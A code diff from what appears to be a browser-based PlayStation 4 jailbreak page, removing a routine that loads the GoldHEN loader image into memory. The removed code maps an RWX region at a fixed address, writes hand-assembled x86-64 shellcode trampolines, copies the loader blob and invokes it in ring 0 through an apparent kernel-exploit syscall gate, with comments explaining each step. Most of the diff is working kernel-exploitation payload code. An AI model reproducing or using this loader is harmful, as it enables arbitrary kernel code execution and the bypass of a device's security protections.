@@ -1222,10 +1222,6 @@ async function runPatchSet(room) {
 async function loadEnabler(url, k, kbase, room) {
   const blob = await fetchBytes(url, "e");
   if (blob === null) return false;
-  if (blob.length === GHL.size) {
-    say("[e] " + blob.length + " bytes -- GoldHEN loader image, entered in ring 0 at its base");
-    return loadGoldhenLoader(url, k, kbase, blob);
-  }
   if (blob.length === GH.nlOff + GH.nlLen) {
     say("[e] " + blob.length + " bytes -- composite image, patch chain path");
     return loadGoldhen(url, k, kbase, room, blob);
@@ -1599,106 +1595,6 @@ async function loadGoldhen(url, k, kbase, room, preloaded) {
   }
   say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
   return silent === 0;
-}
-
-/* ------------------------------------------ GoldHEN loader image */
-
-/* The other GoldHEN form this page accepts: the OpenGoldHEN loader, 291,808
-   bytes, linked at a fixed 0x926200000. Every reference inside it is an
-   absolute address, so the mapping has to land at exactly that base -- the
-   mmap asks for it as a hint and refuses to continue anywhere else, because a
-   loader running from a different address reads its own globals through a
-   pointer into nothing.
-
-   No step chain here. The loader finds the kernel itself through rdmsr,
-   patches the installer (it saves and restores CR0.WP around the writes),
-   inflates the kpayload that follows it in the same image, loads that ELF and
-   calls its entry. It is entered once, in ring 0, with a kernel pointer in
-   rdi -- which is all its entry check looks at. Afterglow's patch set is not
-   run for this form: the payload brings its own. */
-const GHL = {
-  base: 0x926200000, size: 291808,
-  tor: 0x47c00, tram: 0x47c40, sentinel: 0x5758,
-};
-
-async function loadGoldhenLoader(url, k, kbase, preloaded) {
-  const c = host();
-  let blob = preloaded || null;
-  if (blob === null) blob = await fetchBytes(url, "g");
-  if (blob === null) return false;
-  if (blob.length !== GHL.size) {
-    say("[g] " + blob.length + " bytes, expected the loader image's " + GHL.size);
-    return false;
-  }
-  if (blob[0] !== 0xe9) { say("[g] no entry jmp at 0 -- not the loader image"); return false; }
-
-  const size = (blob.length + 0xfff) & ~0xfff;
-  const lo32 = GHL.base % 0x100000000, hi32 = Math.floor(GHL.base / 0x100000000);
-  const base = v(lo32, hi32);
-  /* a hint, not MAP_FIXED: if 0x926200000 is already taken the mmap moves
-     instead of unmapping what is there, and the check below catches it */
-  const m = sc(S.mmap, base, size + 0x1000, 3, 0x1002, -1, 0);
-  if (m.i32 === -1) { say("[g] mmap failed, errno " + c.errno()); return false; }
-  if ((m.lo >>> 0) !== lo32 || (m.hi >>> 0) !== hi32) {
-    say("[g] mmap came back at " + text(v(m.lo, m.hi)) + ", not 0x" + GHL.base.toString(16)
-        + " -- the loader addresses its own data absolutely, refusing");
-    return false;
-  }
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(base, o), 0);
-  if (sc(S.mprotect, base, size + 0x1000, 7).i32 !== 0) {
-    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-
-  /* the userland side of the gate, exactly as the composite path uses it */
-  codeAt(base, GHL.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-  /* ring 3 probe before ring 0 is sent in there: a plain ret, so a page
-     without X kills this process and not the console */
-  codeAt(base, GHL.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(base, GHL.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) {
-    say("[g] the mapping does not execute -- stopping");
-    return false;
-  }
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(base, o), v(lo >>> 0, hi >>> 0));
-  }
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    const q = c.p.read8(plus(base, o));
-    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
-      say("[g] copy mismatch at 0x" + o.toString(16)); return false;
-    }
-  }
-  say("[g] " + blob.length + " bytes at 0x" + GHL.base.toString(16));
-
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(base, GHL.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-
-  tram.n = 0;
-  hex("48bf"); q64(kbase);        /* rdi = kernel base: any kernel pointer passes the entry check */
-  hex("48b8"); q64(base);         /* rax = the loader's first byte, a jump to its entry */
-  hex("ffd0");                    /* call rax */
-  hex("b8"); i32(GHL.sentinel);   /* mov eax, sentinel */
-  hex("c3");
-  const rr = c.callAddr(plus(base, GHL.tor), [11, plus(base, GHL.tram)]);
-  const rl = rr && (rr.lo >>> 0);
-  if (rl !== GHL.sentinel) {
-    say("[g] the loader call returned " + (rr ? "0x" + rl.toString(16) : "nothing")
-        + " -- still running, or it faulted");
-    return false;
-  }
-  say("[g] the loader returned -- banner and install lines follow in klog 3232");
-  return true;
 }
 
 /* ------------------------------------------------- defusing the handles */
